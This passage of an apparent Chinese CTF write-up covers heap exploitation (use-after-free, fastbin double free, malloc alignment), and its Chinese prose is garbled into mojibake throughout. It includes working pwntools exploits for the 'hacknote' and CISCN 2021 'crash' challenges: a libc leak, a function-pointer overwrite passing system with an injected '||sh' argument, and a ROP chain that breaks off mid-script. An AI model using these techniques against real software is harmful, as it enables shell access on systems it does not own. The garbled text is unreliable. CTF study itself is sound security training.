NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mallocå†…å­˜å¯¹é½"><a class="header-anchor" href="#mallocå†…å­˜å¯¹é½">Â¶</a>mallocå†…å­˜å¯¹é½</h3>
<p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å’ŒCåº“é€æ˜åœ°å¸®ä½ å¤„ç†å¯¹é½é—®é¢˜ã€‚POSIX æ ‡æ˜äº†é€šè¿‡malloc( ), calloc( ), å’Œ realloc( ) è¿”å›çš„åœ°å€å¯¹äºä»»ä½•çš„Cç±»å‹æ¥è¯´éƒ½æ˜¯å¯¹é½çš„ã€‚è¿™æ ·å¯ä»¥é¿å…å†…å­˜ä¸­çš„ç¢ç‰‡ï¼Œæé«˜ç¨‹åºæ•ˆç‡ã€‚</p>
<p>æ¥çœ‹ä¸‹malloc.hçš„éƒ¨åˆ†æºç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¿»è¯‘ç¿»è¯‘å°±æ˜¯mallocåœ¨å¯¹å…¶çš„æ—¶ä¾¯ï¼Œå…¶å¯¹å…¶å‚æ•°å¿…é¡»æ˜¯2çš„å¹‚ä¸”åœ¨32ä¸ºä¸‹8byte,64ä½ä¸‹ä¸º16byte</p>
<p>ä½†æ˜¯æœ€å°åˆ†é…å•ä½å¹¶ä¸æ˜¯å¯¹é½å•ä½ï¼Œæœ€å°åˆ†é…å•ä½MINSIZEï¼š</p>
<p>è®¡ç®—MINSIZE=ï¼ˆ16+8-1ï¼‰ &amp; ~ï¼ˆ8-1ï¼‰=16å­—èŠ‚</p>
<p>å³32ä½ä¸‹mallocçš„æœ€å°åˆ†é…å•ä½ä¸º16å­—èŠ‚ï¼Œ64ä½ä¸‹æœ€å°åˆ†é…å•ä½ä¸º32å­—èŠ‚ã€‚</p>
<p>å…¶ä¸­request2sizeå°±æ˜¯mallocçš„å†…å­˜å¯¹é½æ“ä½œã€‚</p>
<p>ä»request2sizeè¿˜å¯ä»¥çŸ¥é“ï¼Œå¦‚æœæ˜¯64ä½ç³»ç»Ÿï¼Œç”³è¯·å†…å­˜ä¸º1~24å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—32å­—èŠ‚ï¼Œå½“ç”³è¯·å†…å­˜ä¸º25å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—48å­—èŠ‚ã€‚ å¦‚æœæ˜¯32ä½ç³»ç»Ÿï¼Œç”³è¯·å†…å­˜ä¸º1~12å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—16å­—èŠ‚ï¼Œå½“ç”³è¯·å†…å­˜ä¸º13å­—èŠ‚æ—¶ï¼Œç³»ç»Ÿå†…å­˜æ¶ˆè€—24å­—èŠ‚ã€‚ï¼ˆç±»ä¼¼è®¡ç®—MINSIZEï¼‰</p>
<h3 id="UAF-çš„åˆ©ç”¨"><a class="header-anchor" href="#UAF-çš„åˆ©ç”¨">Â¶</a>UAF çš„åˆ©ç”¨</h3>
<p>å½“ç”³è¯·ä¸¤ä¸ªfastbinèŒƒå›´å†…çš„å †å—åï¼Œfastbinå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
<p>æ­¤æ—¶å¯ä»¥åˆ©ç”¨UAFä¿®æ”¹chunk0çš„æŒ‡é’ˆï¼Œå½“æˆ‘ä»¬å†æ¬¡ç”³è¯·å‡ºè¿™ä¸¤ä¸ªå †çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”³è¯·åˆ°æƒ³è¦ä¿®æ”¹çš„åœ°å€å¤„,è¿›è¡Œåç»­çš„ä¸€äº›ä¿®æ”¹</p>
<h3 id="double-free"><a class="header-anchor" href="#double-free">Â¶</a>double free</h3>
<p>double free å’Œ UAF ä¸€æ ·åŒæ ·ä¹Ÿæ˜¯ç”±äºæŒ‡é’ˆä¸ºæ¸…ç©ºé€ æˆçš„æ¼æ´ï¼Œä¸UAFçš„æ¼æ´åˆ©ç”¨æ–¹å¼å·®ä¸å¤šï¼Œå¸¸è¢«ç”¨äºä¸fastbin attack ç»„åˆåˆ©ç”¨</p>
<p>ä¸‹é¢ä»‹ç»ä¸€ç§åˆ©ç”¨double free æ¥è¾¾åˆ°ä»»æ„åœ°å€å†™çš„åˆ©ç”¨æ–¹å¼</p>
<p>å½“ç”³è¯·ä¸¤ä¸ªå †å—å¹¶ä¸”é‡Šæ”¾æ—¶fastbinä¸­æœ‰å¦‚ä¸‹ç»“æ„ï¼š</p>
<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
</code></pre>
<p>è€Œæ­¤æ—¶æˆ‘ä»¬å†æ¬¡é‡Šæ”¾chunk1</p>
<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
</code></pre>
<p>å¦‚æœæˆ‘ä»¬æ­¤æ—¶ç”³è¯·ä¸€ä¸ªæ–°çš„chunk</p>
<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
<p>æ­¤æ—¶ä¿®æ”¹new chunkçš„æŒ‡é’ˆ</p>
<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
<p>å†ç”³è¯·ä¸€ä¸ªchunk1</p>
<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
<p>åœ¨ç”³è¯·ä¸€ä¸ªchunkåè¿™ä¸ªchunkå°±ä¼šåˆchunk1é‡åˆï¼Œä¸”fastbiné“¾è¡¨å·²ç»æŒ‡å‘äº†æˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°å€äº†ï¼Œåªè¦å†ç”³è¯·ä¸€ä¸ªå †å—å°±ä¼šç”³è¯·åˆ°æƒ³è¦ä¿®æ”¹çš„åœ°å€ï¼Œç„¶ååªè¦ç¼–è¾‘è¿™ä¸ªå †å—ä¾¿å¯å®Œæˆä»»æ„åœ°å€å†™ã€‚</p>
<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
<h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">Â¶</a>ä¾‹é¢˜</h2>
<h3 id="hacknote"><a class="header-anchor" href="#hacknote">Â¶</a>hacknote</h3>
<h4 id="IDA-åˆ†æ"><a class="header-anchor" href="#IDA-åˆ†æ">Â¶</a>IDA åˆ†æ</h4>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
<p>delete<br>
<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
<h4 id="åˆ©ç”¨æ€è·¯"><a class="header-anchor" href="#åˆ©ç”¨æ€è·¯">Â¶</a>åˆ©ç”¨æ€è·¯</h4>
<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
<p>ç”±ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªnoteçš„æ—¶å€™ï¼Œæ­¤æ—¶å †å—çš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
<p>å…·ä½“åˆ©ç”¨æ–¹å¼å¦‚ä¸‹</p>
<p>æˆ‘ä»¬ç”³è¯·ä¸¤ä¸ªnote,åœ¨è¿›è¡Œé‡Šæ”¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
<p>æ­¤æ—¶struct noteè¢«æ”¾åˆ°fastbin[0] , content è¢«æ”¾å…¥fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
<p>å¦‚æœæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§å°åœ¨fastbin[0]èŒƒå›´å†…çš„å †note2,é‚£ä¹ˆnote2 çš„struct note å’Œ contentå°±ä¼šåˆ†åˆ«æ˜¯fastbin[0]ä¸­çš„note1,å’Œnote0çš„struct note</p>
<p>å› æ­¤æ–°å»ºçš„note2çš„strcut noteå°†è¢«åˆ†é…åˆ°note1çš„ç»“æ„ä½“ä½ç½®ï¼Œnote2çš„contentå°†è¢«åˆ†é…åˆ°note0çš„ç»“æ„ä½“ä½ç½®ï¼Œnote0å…«å­—èŠ‚çš„ç»“æ„ä½“å¤„åˆ†åˆ«å­˜æ”¾äº†æ‰“å°å‡½æ•°0x804862bå’Œå…¶å‚æ•°åœ°å€ï¼Œç°åœ¨å°†è¢«æˆ‘ä»¬è¾“å…¥çš„contentè¦†ç›–</p>
<p>å¦‚æœæˆ‘ä»¬å°†content è¦†ç›–ä¸º __libc_start_mainçš„åœ°å€ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ³„éœ² libc äº† , åŒç†å¯ä»¥æ¢…å¼€äºŒåº¦getshell</p>
<p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°å‘ï¼Œè¦†ç›–åsystemçš„å‚æ•°å®é™…ä¸Šæ˜¯ä»note0ç»“æ„ä½“å¼€å§‹çš„ï¼Œæ‰€ä»¥è¦ç”¨åˆ°systemå‚æ•°æˆªæ–­çš„å§¿åŠ¿ï¼Œå¦‚ï¼š&amp;&amp;shï¼Œ||shï¼Œ;sh;</p>
<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
<p>å¯ä»¥çœ‹åˆ°æœ€åæˆåŠŸè°ƒç”¨äº†system(â€˜shâ€™)</p>
<h4 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="CISCN-2021-è¥¿å—èµ›åŒº-crash"><a class="header-anchor" href="#CISCN-2021-è¥¿å—èµ›åŒº-crash">Â¶</a>CISCN 2021 è¥¿å—èµ›åŒº crash</h3>
<p>è¿™ä¸ªé¢˜å’ŒHCTFçš„fheapï¼Œä¸èƒ½è¯´æ˜¯å®Œå…¨ç›¸åŒï¼Œåªèƒ½è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·äº†ï¼Œä½†å½“æ—¶åªæœ‰ä¸¤ä¸ªé˜Ÿåšå‡ºæ¥</p>
<p>è¿™é“é¢˜åœ¨ç½‘ä¸Šçš„è§£æ³•ä¸€èˆ¬éƒ½æ˜¯UAFï¼Œè¿™é‡Œæä¾›ä¸€ç§double free + ret2csu çš„æ€è·¯</p>
<h4 id="ç¨‹åºåˆ†æ"><a class="header-anchor" href="#ç¨‹åºåˆ†æ">Â¶</a>ç¨‹åºåˆ†æ</h4>
<p>ADD</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>freeLong çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼Œ freeShort å’Œ å®ƒå·®ä¸å¤šéƒ½å­˜åœ¨UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
<p>ä¸»è¦çš„æ¼æ´ç‚¹åœ¨Delete</p>
<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
<h4 id="åˆ©ç”¨æ–¹å¼"><a class="header-anchor" href="#åˆ©ç”¨æ–¹å¼">Â¶</a>åˆ©ç”¨æ–¹å¼</h4>
<pre><code>    IDA ä¸­å¯ä»¥çœ‹åˆ° call puts ä¸ freeShort å’Œ freeLongåœ¨åŒä¸€
é¡µï¼Œè¿™æ ·çš„è¯å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨double freeè¦†ç›–freeLongçš„åœ°å€çš„åä¸¤ä½
ä¸ºcall putsçš„åœ°å€,å½“æˆ‘ä»¬deleteçš„æ—¶å€™å°±ä¼šè°ƒç”¨call puts æ‰“å°å‡ºå­—ç¬¦
ä¸²åœ°å€å¼€å§‹çš„å†…å®¹ï¼Œcall puts çš„åœ°å€å°±åœ¨è¿™ä¸²å†…å®¹é‡Œï¼Œè¿™æ ·å¯ä»¥æ³„éœ²ç¨‹åº
åŸºå€ã€‚

æ‹¿åˆ°ç¨‹åºåœ°å€ä¹‹åå°±å¯ä»¥ç»“åˆdouble free åˆ©ç”¨deleteçš„é‡Œæº¢å‡ºæ¥ret2csu

bssæ®µæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´æ¥å†™å…¥/bin/shæ‰€ä»¥è¦å¾€dataæ®µå†™
</code></pre>
<p>å…·ä½“ä¸å¤šè¯´(<s>ä¸»è¦æ˜¯æ‡’</s>)ï¼šç›´æ¥ä¸Šexp</p>
<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span 